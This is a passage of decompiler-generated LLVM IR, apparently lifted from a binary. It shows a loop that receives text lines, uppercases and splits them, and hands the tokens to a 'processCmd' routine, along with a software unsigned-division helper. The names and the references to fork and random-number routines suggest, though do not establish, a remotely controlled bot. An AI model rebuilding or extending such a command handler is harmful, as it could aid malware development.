  %v2_a328 = load i8, i8* %storemerge13, align 1
  %v2_a32c = icmp eq i8 %v2_a328, 0
  br i1 %v2_a32c, label %dec_label_pc_a604, label %dec_label_pc_a334

dec_label_pc_a334:                                ; preds = %dec_label_pc_a324
  store i8 0, i8* %storemerge13, align 1
  %v3_a354 = call i32 @strlen(i8* %v5_a348)
  %v2_a364 = add i32 %v3_a354, %v2_a614
  %v1_a368 = add i32 %v2_a364, 2
  %v5_a36c = inttoptr i32 %v1_a368 to i8*
  %v1_a39c = add i32 %v2_a364, 1
  br label %dec_label_pc_a398

dec_label_pc_a374:                                ; preds = %dec_label_pc_a3c0, %dec_label_pc_a398
  %v3_a384 = call i32 @strlen(i8* %v5_a36c)
  %v2_a38c = add i32 %v1_a39c, %v3_a384
  %v3_a394 = inttoptr i32 %v2_a38c to i8*
  store i8 0, i8* %v3_a394, align 1
  br label %dec_label_pc_a398

dec_label_pc_a398:                                ; preds = %dec_label_pc_a334, %dec_label_pc_a374
  %v3_a3a8 = call i32 @strlen(i8* %v5_a36c)
  %v2_a3b0 = add i32 %v1_a39c, %v3_a3a8
  %v1_a3b4 = inttoptr i32 %v2_a3b0 to i8*
  %v2_a3b4 = load i8, i8* %v1_a3b4, align 1
  %v7_a3b8 = icmp eq i8 %v2_a3b4, 10
  br i1 %v7_a3b8, label %dec_label_pc_a374, label %dec_label_pc_a3c0

dec_label_pc_a3c0:                                ; preds = %dec_label_pc_a398
  store i32 %v1_a39c, i32* @r4, align 4
  %v3_a3d0 = call i32 @strlen(i8* %v5_a36c)
  %v0_a3d8 = load i32, i32* @r4, align 4
  %v2_a3d8 = add i32 %v0_a3d8, %v3_a3d0
  %v1_a3dc = inttoptr i32 %v2_a3d8 to i8*
  %v2_a3dc = load i8, i8* %v1_a3dc, align 1
  %v7_a3e0 = icmp eq i8 %v2_a3dc, 13
  br i1 %v7_a3e0, label %dec_label_pc_a374, label %dec_label_pc_a3e8

dec_label_pc_a3e8:                                ; preds = %dec_label_pc_a3c0
  %v2_a40424 = load i8, i8* %v5_a36c, align 1
  %v7_a40828 = icmp eq i8 %v2_a40424, 32
  br i1 %v7_a40828, label %dec_label_pc_a420, label %dec_label_pc_a410

dec_label_pc_a3f4:                                ; preds = %dec_label_pc_a410
  %v1_a3f8 = add i32 %v4_a40030, 1
  %v5_a3fc = inttoptr i32 %v1_a3f8 to i8*
  %v2_a404 = load i8, i8* %v5_a3fc, align 1
  %v7_a408 = icmp eq i8 %v2_a404, 32
  br i1 %v7_a408, label %dec_label_pc_a420, label %dec_label_pc_a410

dec_label_pc_a410:                                ; preds = %dec_label_pc_a3e8, %dec_label_pc_a3f4
  %v4_a40030 = phi i32 [ %v1_a3f8, %dec_label_pc_a3f4 ], [ %v1_a368, %dec_label_pc_a3e8 ]
  %stack_var_-60.029 = phi i8* [ %v5_a3fc, %dec_label_pc_a3f4 ], [ %v5_a36c, %dec_label_pc_a3e8 ]
  %v2_a414 = load i8, i8* %stack_var_-60.029, align 1
  %v2_a418 = icmp eq i8 %v2_a414, 0
  br i1 %v2_a418, label %dec_label_pc_a420, label %dec_label_pc_a3f4

dec_label_pc_a420:                                ; preds = %dec_label_pc_a3f4, %dec_label_pc_a410, %dec_label_pc_a3e8
  %stack_var_-60.0.lcssa = phi i8* [ %v5_a36c, %dec_label_pc_a3e8 ], [ %v5_a3fc, %dec_label_pc_a3f4 ], [ %stack_var_-60.029, %dec_label_pc_a410 ]
  %v4_a400.lcssa = phi i32 [ %v1_a368, %dec_label_pc_a3e8 ], [ %v1_a3f8, %dec_label_pc_a3f4 ], [ %v4_a40030, %dec_label_pc_a410 ]
  store i8 0, i8* %stack_var_-60.0.lcssa, align 1
  %v1_a430 = add i32 %v4_a400.lcssa, 1
  %v2_a47435 = load i8, i8* %v5_a36c, align 1
  %v2_a47837 = icmp eq i8 %v2_a47435, 0
  br i1 %v2_a47837, label %dec_label_pc_a480, label %dec_label_pc_a444

dec_label_pc_a444:                                ; preds = %dec_label_pc_a420, %dec_label_pc_a444
  %storemerge1239 = phi i8* [ %storemerge12, %dec_label_pc_a444 ], [ %v5_a36c, %dec_label_pc_a420 ]
  %storemerge1938 = phi i32 [ %v1_a468, %dec_label_pc_a444 ], [ %v1_a368, %dec_label_pc_a420 ]
  %v2_a448 = load i8, i8* %storemerge1239, align 1
  %v3_a448 = zext i8 %v2_a448 to i32
  %v1_a450 = call i32 @__GI_toupper(i32 %v3_a448)
  %v1_a460 = trunc i32 %v1_a450 to i8
  store i8 %v1_a460, i8* %storemerge1239, align 1
  %v1_a468 = add i32 %storemerge1938, 1
  %storemerge12 = inttoptr i32 %v1_a468 to i8*
  %v2_a474 = load i8, i8* %storemerge12, align 1
  %v2_a478 = icmp eq i8 %v2_a474, 0
  br i1 %v2_a478, label %dec_label_pc_a480, label %dec_label_pc_a444

dec_label_pc_a480:                                ; preds = %dec_label_pc_a444, %dec_label_pc_a420
  %v2_a494 = call i32 @__GI_strtok(i32 %v1_a430, i32 ptrtoint (i32* @global_var_157a8.66 to i32))
  store i32 %v1_a368, i32* %stack_var_-188, align 4
  %v2_a58c42 = icmp eq i32 %v2_a494, 0
  br i1 %v2_a58c42, label %dec_label_pc_a594, label %dec_label_pc_a4ac

dec_label_pc_a4ac:                                ; preds = %dec_label_pc_a480, %dec_label_pc_a574
  %stack_var_-32.045.in = phi i32 [ %v2_a57c, %dec_label_pc_a574 ], [ %v2_a494, %dec_label_pc_a480 ]
  %stack_var_-36.143 = phi i32 [ %stack_var_-36.0, %dec_label_pc_a574 ], [ 1, %dec_label_pc_a480 ]
  %stack_var_-32.045 = inttoptr i32 %stack_var_-32.045.in to i8*
  %v2_a4b0 = load i8, i8* %stack_var_-32.045, align 1
  %v7_a4b4 = icmp eq i8 %v2_a4b0, 10
  br i1 %v7_a4b4, label %dec_label_pc_a574, label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %dec_label_pc_a4ac
  store i32 %stack_var_-36.143, i32* @r4, align 4
  %v3_a4c8 = call i32 @strlen(i8* nonnull %stack_var_-32.045)
  %v1_a4d0 = add i32 %v3_a4c8, 1
  %v1_a4d8 = call i32 @malloc(i32 %v1_a4d0)
  %v0_a4e8 = load i32, i32* @r4, align 4
  %v3_a4e8 = mul i32 %v0_a4e8, 4
  %v2_a4f4 = add i32 %v2_a5d4, %v3_a4e8
  %v2_a4f8 = inttoptr i32 %v2_a4f4 to i32*
  store i32 %v1_a4d8, i32* %v2_a4f8, align 4
  %v3_a504 = mul i32 %stack_var_-36.143, 4
  %v2_a510 = add i32 %v2_a5d4, %v3_a504
  %v1_a514 = inttoptr i32 %v2_a510 to i32*
  %v2_a514 = load i32, i32* %v1_a514, align 4
  store i32 %v2_a514, i32* @r4, align 4
  %v3_a520 = call i32 @strlen(i8* nonnull %stack_var_-32.045)
  %v1_a528 = add i32 %v3_a520, 1
  %v0_a52c = load i32, i32* @r4, align 4
  store i32 %v1_a528, i32* @r2, align 4
  %v2_a538 = inttoptr i32 %v0_a52c to i8*
  %v3_a538 = call i32 @__GI_memset(i8* %v2_a538, i32 0)
  %v2_a554 = load i32, i32* %v1_a514, align 4
  store i32 %stack_var_-32.045.in, i32* @r1, align 4
  %v3_a564 = inttoptr i32 %v2_a554 to i8*
  %v4_a564 = call i32 @strcpy(i8* %v3_a564, i32 %stack_var_-32.045.in)
  %v1_a56c = add i32 %stack_var_-36.143, 1
  br label %dec_label_pc_a574

dec_label_pc_a574:                                ; preds = %dec_label_pc_a4ac, %dec_label_pc_a4bc
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.143, %dec_label_pc_a4ac ], [ %v1_a56c, %dec_label_pc_a4bc ]
  %v2_a57c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_157a8.66 to i32))
  %v2_a58c = icmp eq i32 %v2_a57c, 0
  br i1 %v2_a58c, label %dec_label_pc_a594, label %dec_label_pc_a4ac

dec_label_pc_a594:                                ; preds = %dec_label_pc_a574, %dec_label_pc_a480
  %stack_var_-36.1.lcssa = phi i32 [ 1, %dec_label_pc_a480 ], [ %stack_var_-36.0, %dec_label_pc_a574 ]
  %v3_a5a0 = call i32 @processCmd(i32 %stack_var_-36.1.lcssa, i32* nonnull %stack_var_-188)
  %v7_a5ac = icmp slt i32 %stack_var_-36.1.lcssa, 2
  br i1 %v7_a5ac, label %dec_label_pc_a604, label %dec_label_pc_a5c4.lr.ph

dec_label_pc_a5c4.lr.ph:                          ; preds = %dec_label_pc_a594
  br label %dec_label_pc_a5c4

dec_label_pc_a5c4:                                ; preds = %dec_label_pc_a5c4.lr.ph, %dec_label_pc_a5c4
  %storemerge20113 = phi i32 [ 1, %dec_label_pc_a5c4.lr.ph ], [ %v1_a5ec, %dec_label_pc_a5c4 ]
  %v3_a5cc = mul i32 %storemerge20113, 4
  %v2_a5d8 = add i32 %v2_a5d4, %v3_a5cc
  %v1_a5dc = inttoptr i32 %v2_a5d8 to i32*
  %v2_a5dc = load i32, i32* %v1_a5dc, align 4
  store i32 %v2_a5dc, i32* @r0, align 4
  %v0_a5e4 = call i32 @free()
  %v1_a5ec = add nuw nsw i32 %storemerge20113, 1
  %v5_a600 = icmp slt i32 %v1_a5ec, %stack_var_-36.1.lcssa
  br i1 %v5_a600, label %dec_label_pc_a5c4, label %dec_label_pc_a604

dec_label_pc_a604:                                ; preds = %dec_label_pc_a5c4, %dec_label_pc_a294, %dec_label_pc_a594, %dec_label_pc_a324, %dec_label_pc_9fa0
  %v2_a608 = load i32, i32* @global_var_1f320.40, align 4
  %v5_a624 = call i32 @recvLine(i32 %v2_a608, i8* %v4_a624, i32 4096, i32 %v2_a614)
  %v3_a634 = icmp eq i32 %v5_a624, -1
  br i1 %v3_a634, label %dec_label_pc_9f90, label %dec_label_pc_a220

; uselistorder directives
  uselistorder i32 %v5_a624, { 1, 0 }
  uselistorder i32 %stack_var_-36.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_a57c, { 1, 0 }
  uselistorder i8* %stack_var_-32.045, { 2, 1, 0 }
  uselistorder i32 %stack_var_-36.143, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge12, { 1, 0 }
  uselistorder i32 %v1_a468, { 1, 0 }
  uselistorder i8* %storemerge1239, { 1, 0 }
  uselistorder i32 %v1_a39c, { 2, 1, 0 }
  uselistorder i8* %v5_a36c, { 0, 3, 2, 1, 4, 5, 7, 6 }
  uselistorder i32 %v1_a368, { 3, 0, 2, 1, 4 }
  uselistorder i8* %storemerge13, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_a25c, { 1, 0 }
  uselistorder i32 %v3_a270, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_a1a0, { 1, 0 }
  uselistorder i32 %v3_a1d4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a148, { 1, 0 }
  uselistorder i32 %v1_a12c, { 1, 0 }
  uselistorder i32 %v5_a068, { 1, 0 }
  uselistorder i32 %v1_9ffc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_a018, { 1, 0 }
  uselistorder i32 %v2_a00c, { 1, 0 }
  uselistorder i32 %v2_a5d4, { 2, 0, 1 }
  uselistorder i8* %v4_a624, { 3, 0, 1, 2 }
  uselistorder i32 %v2_a614, { 3, 0, 1, 2 }
  uselistorder i32 %v0_9f1c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_9e1c, { 0, 1, 3, 2 }
  uselistorder i32 %v2_9dcc, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_1f320.40, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_1f318.42, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_21568.45, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 ()* @rand_next, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @rand_init, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a604, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_a5c4, { 1, 0 }
  uselistorder label %dec_label_pc_a574, { 1, 0 }
  uselistorder label %dec_label_pc_a4ac, { 1, 0 }
  uselistorder label %dec_label_pc_a444, { 1, 0 }
  uselistorder label %dec_label_pc_a420, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a410, { 1, 0 }
  uselistorder label %dec_label_pc_a398, { 1, 0 }
  uselistorder label %dec_label_pc_a304, { 1, 0 }
  uselistorder label %dec_label_pc_a294, { 1, 0 }
  uselistorder label %dec_label_pc_a214, { 1, 0 }
  uselistorder label %dec_label_pc_a184, { 1, 0 }
  uselistorder label %dec_label_pc_a04c, { 1, 0 }
  uselistorder label %dec_label_pc_9f90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9f7c, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_a658 = load i32, i32* @r1, align 4
  %v1_a658 = add i32 %v0_a658, -1
  store i32 %v1_a658, i32* %r2.global-to-local, align 4
  %v2_a658 = icmp eq i32 %v0_a658, 0
  %v7_a658 = icmp eq i32 %v0_a658, 1
  %v0_a65c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_a658, i32 %v0_a65c)
  br i1 %v2_a658, label %dec_label_pc_a740, label %dec_label_pc_a664

dec_label_pc_a664:                                ; preds = %entry
  %v0_a664 = load i32, i32* %r0.global-to-local, align 4
  %v1_a664 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_a664, %v1_a664
  br i1 %tmp, label %dec_label_pc_a66c, label %dec_label_pc_a6f8

dec_label_pc_a66c:                                ; preds = %dec_label_pc_a664
  %v1_a66c = load i32, i32* %r2.global-to-local, align 4
  %v2_a66c = and i32 %v1_a66c, %v1_a664
  %v4_a66c = icmp eq i32 %v2_a66c, 0
  br i1 %v4_a66c, label %dec_label_pc_a704, label %dec_label_pc_a674

dec_label_pc_a674:                                ; preds = %dec_label_pc_a66c
  %v3_a674 = icmp ult i32 %v1_a664, 536870912
  br i1 %v3_a674, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_a674
  %v4_a678 = mul i32 %v1_a664, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_a674, %.thread
  %v0_a698.pr36.ph = phi i32 [ %v4_a678, %.thread ], [ %v1_a664, %dec_label_pc_a674 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_a674 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_a698.pr36 = phi i32 [ %v4_a68c, %bb81 ], [ %v0_a698.pr36.ph, %.preheader.preheader ]
  %v1_a690 = phi i32 [ %v4_a690, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_a684 = icmp ugt i32 %v0_a698.pr36, 268435455
  br i1 %v2_a684, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_a698thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_a688 = icmp ult i32 %v0_a698.pr36, %v0_a664
  br i1 %v4_a688, label %bb80, label %dec_label_pc_a698thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_a68c = and i32 %v0_a698.pr36, 268435456
  %v3_a68c = icmp eq i32 %v2_a68c, 0
  %v4_a68c = mul i32 %v0_a698.pr36, 16
  br i1 %v3_a68c, label %bb81, label %dec_label_pc_a698.loopexit

bb81:                                             ; preds = %bb80
  %v2_a690 = and i32 %v1_a690, 268435456
  %v3_a690 = icmp eq i32 %v2_a690, 0
  %v4_a690 = mul i32 %v1_a690, 16
  br i1 %v3_a690, label %.preheader, label %dec_label_pc_a698thread-pre-split.loopexit.loopexit

dec_label_pc_a698thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_a6a448.ph = phi i32 [ %v1_a690, %bb ], [ %v4_a690, %bb81 ]
  %v0_a698.pr38.ph = phi i32 [ %v0_a698.pr36, %bb ], [ %v4_a68c, %bb81 ]
  br label %dec_label_pc_a698thread-pre-split.loopexit

dec_label_pc_a698thread-pre-split.loopexit:       ; preds = %dec_label_pc_a698thread-pre-split.loopexit.loopexit, %.thread2
  %v1_a6a448 = phi i32 [ %v1_a690, %.thread2 ], [ %v1_a6a448.ph, %dec_label_pc_a698thread-pre-split.loopexit.loopexit ]
  %v0_a698.pr38 = phi i32 [ %v0_a698.pr36, %.thread2 ], [ %v0_a698.pr38.ph, %dec_label_pc_a698thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_a698thread-pre-split

dec_label_pc_a698thread-pre-split:                ; preds = %dec_label_pc_a698thread-pre-split.loopexit, %bb83
  %v1_a6a446 = phi i32 [ %v1_a6a448, %dec_label_pc_a698thread-pre-split.loopexit ], [ %v3_a6a4, %bb83 ]
  %v0_a698.pr = phi i32 [ %v0_a698.pr38, %dec_label_pc_a698thread-pre-split.loopexit ], [ %v3_a6a0, %bb83 ]
  br label %dec_label_pc_a698

dec_label_pc_a698.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_a698

dec_label_pc_a698:                                ; preds = %dec_label_pc_a698.loopexit, %dec_label_pc_a698thread-pre-split
  %v1_a6a4 = phi i32 [ %v1_a6a446, %dec_label_pc_a698thread-pre-split ], [ %v1_a690, %dec_label_pc_a698.loopexit ]
  %v1_a6a0 = phi i32 [ %v0_a698.pr, %dec_label_pc_a698thread-pre-split ], [ %v4_a68c, %dec_label_pc_a698.loopexit ]
  %v2_a698 = icmp slt i32 %v1_a6a0, 0
  br i1 %v2_a698, label %dec_label_pc_a6ac, label %bb82

bb82:                                             ; preds = %dec_label_pc_a698
  %v4_a69c = icmp ult i32 %v1_a6a0, %v0_a664
  br i1 %v4_a69c, label %bb83, label %dec_label_pc_a6ac

bb83:                                             ; preds = %bb82
  %v3_a6a0 = mul i32 %v1_a6a0, 2
  %v2_a6a4 = icmp slt i32 %v1_a6a4, 0
  %v3_a6a4 = mul i32 %v1_a6a4, 2
  br i1 %v2_a6a4, label %dec_label_pc_a6ac, label %dec_label_pc_a698thread-pre-split

dec_label_pc_a6ac:                                ; preds = %bb82, %dec_label_pc_a698, %bb83
  %v2_a6b859 = phi i32 [ %v3_a6a4, %bb83 ], [ %v1_a6a4, %bb82 ], [ %v1_a6a4, %dec_label_pc_a698 ]
  %v1_a6b051 = phi i32 [ %v3_a6a0, %bb83 ], [ %v1_a6a0, %bb82 ], [ %v1_a6a0, %dec_label_pc_a698 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_a6b0

dec_label_pc_a6b0:                                ; preds = %.thread11, %dec_label_pc_a6ac
  %v1_a6e4 = phi i32 [ %v4_a6e4, %.thread11 ], [ %v2_a6b859, %dec_label_pc_a6ac ]
  %v1_a6b8 = phi i32 [ %v0_a6f0, %.thread11 ], [ 0, %dec_label_pc_a6ac ]
  %v1_a6e8 = phi i32 [ %v4_a6e8, %.thread11 ], [ %v1_a6b051, %dec_label_pc_a6ac ]
  %v1_a6b4 = phi i32 [ %v0_a6e0, %.thread11 ], [ %v0_a664, %dec_label_pc_a6ac ]
  %v3_a6b0 = icmp ult i32 %v1_a6b4, %v1_a6e8
  br i1 %v3_a6b0, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_a6b0
  %v3_a6b4 = sub i32 %v1_a6b4, %v1_a6e8
  store i32 %v3_a6b4, i32* %r0.global-to-local, align 4
  %v3_a6b8 = or i32 %v1_a6b8, %v1_a6e4
  store i32 %v3_a6b8, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_a6b0, %bb84
  %v1_a6c0 = phi i32 [ %v1_a6b4, %dec_label_pc_a6b0 ], [ %v3_a6b4, %bb84 ]
  %v1_a6c4 = phi i32 [ %v1_a6b8, %dec_label_pc_a6b0 ], [ %v3_a6b8, %bb84 ]
  %v4_a6bc = udiv i32 %v1_a6e8, 2
  %v6_a6bc = icmp ult i32 %v1_a6c0, %v4_a6bc
  br i1 %v6_a6bc, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_a6c0 = urem i32 %v1_a6e8, 2
  %v4_a6c0 = icmp eq i32 %v3_a6c0, 0
  %v6_a6c0 = sub i32 %v1_a6c0, %v4_a6bc
  store i32 %v6_a6c0, i32* %r0.global-to-local, align 4
  br i1 %v4_a6c0, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_a6c4 = udiv i32 %v1_a6e4, 2
  %v6_a6c4 = or i32 %v1_a6c4, %v5_a6c4
  store i32 %v6_a6c4, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_a6cc = phi i32 [ %v6_a6c0, %bb85 ], [ %v1_a6c0, %.thread7 ], [ %v6_a6c0, %bb86 ]
  %v1_a6d0 = phi i32 [ %v1_a6c4, %bb85 ], [ %v1_a6c4, %.thread7 ], [ %v6_a6c4, %bb86 ]
  %v4_a6c8 = udiv i32 %v1_a6e8, 4
  %v6_a6c8 = icmp ult i32 %v1_a6cc, %v4_a6c8
  br i1 %v6_a6c8, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_a6cc = and i32 %v1_a6e8, 2
  %v4_a6cc = icmp eq i32 %v3_a6cc, 0
  %v6_a6cc = sub i32 %v1_a6cc, %v4_a6c8
  store i32 %v6_a6cc, i32* %r0.global-to-local, align 4
  br i1 %v4_a6cc, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_a6d0 = udiv i32 %v1_a6e4, 4
  %v6_a6d0 = or i32 %v1_a6d0, %v5_a6d0
  store i32 %v6_a6d0, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_a6d8 = phi i32 [ %v6_a6cc, %bb87 ], [ %v1_a6cc, %.thread8 ], [ %v6_a6cc, %bb88 ]
  %v1_a6dc = phi i32 [ %v1_a6d0, %bb87 ], [ %v1_a6d0, %.thread8 ], [ %v6_a6d0, %bb88 ]
  %v4_a6d4 = udiv i32 %v1_a6e8, 8
  %v6_a6d4 = icmp ult i32 %v1_a6d8, %v4_a6d4
  br i1 %v6_a6d4, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_a6d8 = and i32 %v1_a6e8, 4
  %v4_a6d8 = icmp eq i32 %v3_a6d8, 0
  %v6_a6d8 = sub i32 %v1_a6d8, %v4_a6d4
  store i32 %v6_a6d8, i32* %r0.global-to-local, align 4
  br i1 %v4_a6d8, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_a6dc = udiv i32 %v1_a6e4, 8
  %v6_a6dc = or i32 %v1_a6dc, %v5_a6dc
  store i32 %v6_a6dc, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_a6f0 = phi i32 [ %v1_a6dc, %bb89 ], [ %v1_a6dc, %.thread9 ], [ %v6_a6dc, %bb90 ]
  %v0_a6e0 = phi i32 [ %v6_a6d8, %bb89 ], [ %v1_a6d8, %.thread9 ], [ %v6_a6d8, %bb90 ]
  %v2_a6e0 = icmp eq i32 %v0_a6e0, 0
  br i1 %v2_a6e0, label %dec_label_pc_a6f0, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_a6e4, 16
  br i1 %tmp138, label %dec_label_pc_a6f0, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_a6e4 = udiv i32 %v1_a6e4, 16
  %v4_a6e8 = udiv i32 %v1_a6e8, 16
  br label %dec_label_pc_a6b0

dec_label_pc_a6f0:                                ; preds = %thread-pre-split, %bb91
  store i32 %v0_a6f0, i32* %r0.global-to-local, align 4
  ret i32 %v0_a6f0

dec_label_pc_a6f8:                                ; preds = %dec_label_pc_a664
  %v9_a664 = icmp eq i32 %v0_a664, %v1_a664
  %. = zext i1 %v9_a664 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_a704:                                ; preds = %dec_label_pc_a66c
  %v2_a704 = icmp ugt i32 %v1_a664, 65535
  br i1 %v2_a704, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_a704
  %v2_a708 = and i32 %v1_a664, 32768
  %v3_a708 = icmp eq i32 %v2_a708, 0
  %v4_a708 = udiv i32 %v1_a664, 65536
  br i1 %v3_a708, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_a704
  %v0_a71465 = phi i32 [ %v1_a664, %dec_label_pc_a704 ], [ %v4_a708, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_a718 = phi i32 [ %v0_a71465, %.thread16 ], [ %v4_a708, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_a714 = icmp ugt i32 %v1_a718, 255
  br i1 %v2_a714, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_a718 = and i32 %v1_a718, 128
  %v3_a718 = icmp eq i32 %v2_a718, 0
  %v4_a718 = udiv i32 %v1_a718, 256
  br i1 %v3_a718, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_a71c = or i32 %storemerge, 8
  store i32 %v2_a71c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_a728 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_a71c, %bb98 ]
  %v1_a724 = phi i32 [ %v1_a718, %bb96 ], [ %v4_a718, %bb97 ], [ %v4_a718, %bb98 ]
  %v2_a720 = icmp ugt i32 %v1_a724, 15
  br i1 %v2_a720, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_a724 = and i32 %v1_a724, 8
  %v3_a724 = icmp eq i32 %v2_a724, 0
  %v4_a724 = udiv i32 %v1_a724, 16
  br i1 %v3_a724, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_a728 = add nsw i32 %v1_a728, 4
  store i32 %v2_a728, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_a730 = phi i32 [ %v1_a728, %.thread17 ], [ %v1_a728, %bb99 ], [ %v2_a728, %bb100 ]
  %v5_a734 = phi i32 [ %v1_a724, %.thread17 ], [ %v4_a724, %bb99 ], [ %v4_a724, %bb100 ]
  %v2_a72c = icmp ugt i32 %v5_a734, 3
  %v7_a72c = icmp eq i32 %v5_a734, 4
  %v2_a730 = xor i1 %v7_a72c, true
  %v3_a730 = and i1 %v2_a72c, %v2_a730
  br i1 %v3_a730, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_a730 = add nsw i32 %v4_a730, 3
  store i32 %v5_a730, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_a734 = phi i32 [ %v4_a730, %.thread18 ], [ %v5_a730, %bb101 ]
  %v2_a734 = xor i1 %v2_a72c, true
  %v3_a734 = or i1 %v7_a72c, %v2_a734
  br i1 %v3_a734, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_a734 = udiv i32 %v5_a734, 2
  %v9_a734 = add i32 %v4_a734, %v8_a734
  store i32 %v9_a734, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_a738 = phi i32 [ %v4_a734, %bb102 ], [ %v9_a734, %bb103 ]
  %v6_a738 = lshr i32 %v0_a664, %v1_a738
  store i32 %v6_a738, i32* %r0.global-to-local, align 4
  ret i32 %v6_a738

dec_label_pc_a740:                                ; preds = %entry
  %v0_a744 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_a734, { 1, 0 }
  uselistorder i1 %v7_a72c, { 1, 0 }
  uselistorder i32 %v4_a724, { 1, 0 }
  uselistorder i32 %v1_a724, { 1, 0, 2, 3 }
  uselistorder i32 %v2_a71c, { 1, 0 }
  uselistorder i32 %v4_a718, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a718, { 1, 0, 2, 3 }
  uselistorder i32 %v4_a708, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_a6e0, { 1, 0 }
  uselistorder i32 %v0_a6f0, { 1, 0, 2 }
  uselistorder i32 %v4_a6d4, { 1, 0 }
  uselistorder i32 %v1_a6dc, { 1, 2, 0 }
  uselistorder i32 %v4_a6c8, { 1, 0 }
  uselistorder i32 %v1_a6d0, { 1, 2, 0 }
  uselistorder i32 %v4_a6bc, { 1, 0 }
  uselistorder i32 %v1_a6c4, { 1, 2, 0 }
  uselistorder i32 %v1_a6e8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_a6b8, { 1, 0 }
  uselistorder i32 %v1_a6e4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_a6a4, { 1, 0 }
